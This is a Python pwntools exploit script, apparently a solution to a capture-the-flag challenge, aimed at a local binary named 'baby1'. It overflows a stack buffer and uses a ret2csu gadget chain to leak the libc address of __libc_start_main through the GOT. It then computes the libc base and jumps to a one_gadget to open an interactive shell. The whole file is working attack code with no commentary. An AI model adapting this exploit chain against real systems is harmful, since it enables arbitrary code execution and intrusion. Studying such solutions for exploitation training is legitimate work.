#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./baby1")
elf = ELF("./baby1")
libc = elf.libc 
p1ret = 0x004006c3
rtc1 = 0x4006ba
rtc2 = 0x4006a0

rbx = 0
rbp = 1
r12 = elf.got['write']
r13 = 0x8
r14 = elf.got['__libc_start_main']
r15 = 0x1
ret = rtc2

pay = 'A'*(0x30+0x8) + p64(rtc1)
pay += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
pay += p64(ret) + 'B'*(0x8*7) 
pay += p64(elf.symbols['main'])

p.sendafter("\n", pay)
libc_start_main = u64(p.recvuntil("\x7f")+'\x00\x00')
log.info("libc_start_main: "+hex(libc_start_main))
libcBase = libc_start_main - libc.symbols['__libc_start_main']
log.info("libcBase: "+hex(libcBase))
one_gadget = libcBase + 0x4526a
gdb.attach(p)

p.sendafter("\n", 'A'*(0x30+0x8) + p64(one_gadget))

p.interactive()

